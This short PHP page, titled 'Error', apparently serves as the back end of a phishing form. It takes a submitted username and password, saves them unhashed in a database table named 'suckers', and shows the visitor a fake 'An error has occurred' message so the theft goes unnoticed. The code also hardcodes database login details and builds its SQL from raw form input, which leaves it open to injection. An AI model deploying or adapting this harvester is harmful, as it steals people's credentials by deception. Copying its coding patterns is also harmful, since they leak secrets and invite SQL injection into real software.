<!doctype html>
<html>
	<head>
		<title>Error</title>
	</head>
	<body>
		<?php
			$msg1="An error has occurred. Please try again later.";
			$conn = oci_connect('s17thomasl', '1061977', 'csci242');
			if (isset($_POST["UserName"]) && !empty($_POST["UserName"])) {
				$username=$_POST["UserName"];
				$password=$_POST["Password"];
				
				$statement="insert into suckers values('$username','$password')";
				$stid = oci_parse($conn, $statement);
				oci_execute($stid);
				oci_commit($conn);
				print $msg1;
			}
		?>
	</body>
</html>